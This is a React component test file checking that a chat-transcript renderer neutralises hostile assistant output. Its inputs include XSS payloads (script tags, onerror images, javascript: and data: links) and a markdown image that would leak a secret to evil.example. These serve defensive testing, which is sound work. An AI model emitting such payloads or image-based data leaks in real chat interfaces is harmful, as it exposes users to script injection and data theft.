import { fireEvent, render, screen } from '@testing-library/react'
import { describe, expect, it, vi } from 'vitest'
import type { TranscriptEntry } from '../hooks/use-mux-api'
import { ChatMessage, safeUrl } from './chat-message'

const assistant = (text: string): TranscriptEntry => ({
  id: 'a',
  role: 'assistant',
  parts: [{ kind: 'text', text }],
})

describe('ChatMessage', () => {
  it('renders assistant markdown, tables included', () => {
    render(
      <ChatMessage
        entry={assistant(
          '**bold** and `code`\n\n| a | b |\n|---|---|\n| 1 | 2 |',
        )}
      />,
    )
    expect(screen.getByText('bold').tagName).toBe('STRONG')
    expect(screen.getByText('code').tagName).toBe('CODE')
    expect(screen.getByRole('table')).toBeInTheDocument()
  })

  it('shows raw HTML as text, never as elements', () => {
    const { container } = render(
      <ChatMessage
        entry={assistant(
          '<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>',
        )}
      />,
    )
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('img')).toBeNull()
    expect(container).toHaveTextContent('<script>alert(1)</script>')
  })

  it('sanitizes markdown with malicious attributes and event handlers', () => {
    const { container } = render(
      <ChatMessage
        entry={assistant(
          '[link](javascript:alert(1))\n\n<a href="javascript:alert(2)" onclick="alert(3)">click</a>',
        )}
      />,
    )
    // javascript: links are removed entirely
    expect(screen.queryByRole('link', { name: 'link' })).toBeNull()
    // Raw HTML is shown as text
    expect(container).toHaveTextContent('<a href="javascript:alert(2)"')
    expect(container.querySelector('a[onclick]')).toBeNull()
  })

  it('sanitizes data: URLs and other non-http schemes', () => {
    const { container } = render(
      <ChatMessage
        entry={assistant(
          '![](data:text/html,<script>alert(1)</script>)\n\n[link](data:text/html,<h1>xss</h1>)',
        )}
      />,
    )
    // data: image links should become unavailable
    expect(container).toHaveTextContent('[image: unavailable]')
    // data: text links should not be clickable
    expect(screen.queryByRole('link', { name: 'link' })).toBeNull()
  })

  it('an image becomes a link that loads nothing', () => {
    const { container } = render(
      <ChatMessage
        entry={assistant(
          '![leak](https://evil.example/p?d=secret) ![x](javascript:alert(1)) ![](ftp://h/x)',
        )}
      />,
    )
    expect(container.querySelector('img')).toBeNull()
    const link = screen.getByRole('link', { name: 'image: evil.example' })
    expect(link).toHaveAttribute('href', 'https://evil.example/p?d=secret')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
    expect(container).toHaveTextContent('[image: x]')
    expect(container).toHaveTextContent('[image: unavailable]')
  })

  it('opens only http(s) links, in a new tab', () => {
    render(
      <ChatMessage
        entry={assistant(
          '[ok](https://a.example) [bad](javascript:alert(1)) [mail](mailto:a@b.c)',
        )}
      />,
    )
    const ok = screen.getByRole('link', { name: 'ok' })
    expect(ok).toHaveAttribute('target', '_blank')
    expect(ok).toHaveAttribute('rel', 'noopener noreferrer')
    expect(screen.queryByRole('link', { name: 'bad' })).toBeNull()
    expect(screen.queryByRole('link', { name: 'mail' })).toBeNull()
    expect(screen.getByText('bad')).toBeInTheDocument()
  })

  it('user text is plain, right-aligned, with an image chip', () => {
    const { container } = render(
      <ChatMessage
        entry={{
          id: 'u',
          role: 'user',
          parts: [
            { kind: 'text', text: '**not bold**\nline 2' },
            { kind: 'image' },
          ],
        }}
      />,
    )
    expect(container.querySelector('strong')).toBeNull()
    expect(container).toHaveTextContent('**not bold**')
    expect(container.firstElementChild).toHaveAttribute('data-role', 'user')
    expect(container.firstElementChild).toHaveClass('items-end')
    expect(screen.getByText('[image]')).toBeInTheDocument()
  })

  it('a tool call is one line that opens to its result', () => {
    render(
      <ChatMessage
        entry={{
          id: 't',
          role: 'assistant',
          parts: [
            {
              kind: 'tool',
              tool: 'Bash',
              toolId: '1',
              input: 'npm test',
              result: 'ok',
              clipped: true,
            },
            { kind: 'tool', tool: 'Read', toolId: '2', input: 'a.ts' },
          ],
        }}
      />,
    )
    expect(screen.getByText('Bash')).toBeInTheDocument()
    expect(screen.getByText('npm test')).toBeInTheDocument()
    fireEvent.click(screen.getByText('Bash'))
    expect(screen.getByText('ok').tagName).toBe('PRE')
    expect(screen.getByText('(shortened)')).toBeInTheDocument()
    expect(screen.getByText('No result yet')).toBeInTheDocument()
  })

  it('an error result is marked; an orphan says where its call is', () => {
    const { container } = render(
      <ChatMessage
        entry={{
          id: 't',
          role: 'user',
          parts: [
            {
              kind: 'tool',
              toolId: '9',
              result: 'boom',
              isError: true,
              orphan: true,
            },
          ],
        }}
      />,
    )
    expect(screen.getByText('Result')).toBeInTheDocument()
    expect(screen.getByText('boom')).toHaveClass('text-danger')
    expect(container.querySelector('summary')).toHaveClass('text-danger')
    expect(
      screen.getByText('The call is in an earlier part of the conversation.'),
    ).toBeInTheDocument()
  })

  it('thinking is behind a disclosure', () => {
    render(
      <ChatMessage
        entry={{
          id: 'th',
          role: 'assistant',
          parts: [{ kind: 'thinking', text: 'hmm', clipped: true }],
        }}
      />,
    )
    expect(screen.getByText('Thinking').closest('details')).not.toHaveAttribute(
      'open',
    )
    expect(screen.getByText('hmm')).toBeInTheDocument()
  })

  it('a compact summary is a divider', () => {
    const { container } = render(
      <ChatMessage
        entry={{
          id: 's',
          role: 'summary',
          parts: [{ kind: 'text', text: 'We fixed the build.' }],
        }}
      />,
    )
    expect(container.firstElementChild).toHaveAttribute('data-role', 'summary')
    expect(screen.getByText('Conversation compacted')).toBeInTheDocument()
    expect(screen.getByText('We fixed the build.')).toBeInTheDocument()
  })

  it('a note is small text; a clipped line says why it is missing', () => {
    render(
      <ChatMessage
        entry={{
          id: 'n',
          role: 'note',
          parts: [
            { kind: 'text', text: 'Set model to opus' },
            { kind: 'text', clipped: true },
          ],
        }}
      />,
    )
    expect(screen.getByText('Set model to opus')).toBeInTheDocument()
    expect(screen.getByText('A line too large to show')).toBeInTheDocument()
  })

  it('an assistant text part without text renders empty', () => {
    const { container } = render(
      <ChatMessage
        entry={{ id: 'e', role: 'assistant', parts: [{ kind: 'text' }] }}
      />,
    )
    expect(container).toHaveTextContent('')
  })

  it('render images without creating network requests', () => {
    const fetchSpy = vi.spyOn(globalThis, 'fetch')
    const { container } = render(
      <ChatMessage
        entry={assistant(
          '![photo](https://example.com/image.jpg)\n\nSome text here',
        )}
      />,
    )
    // Verify no fetch or image load was triggered
    expect(fetchSpy).not.toHaveBeenCalled()
    expect(container.querySelector('img')).toBeNull()
    // Verify the text link is there instead
    const link = screen.getByRole('link', { name: 'image: example.com' })
    expect(link).toHaveAttribute('href', 'https://example.com/image.jpg')
    fetchSpy.mockRestore()
  })
})

describe('safeUrl', () => {
  it('accepts http(s) URLs only', () => {
    expect(safeUrl('https://a.example/x')?.host).toBe('a.example')
    expect(safeUrl('http://a.example')).not.toBeNull()
    expect(safeUrl('javascript:alert(1)')).toBeNull()
    expect(safeUrl('not a url')).toBeNull()
    expect(safeUrl(undefined)).toBeNull()
  })
})
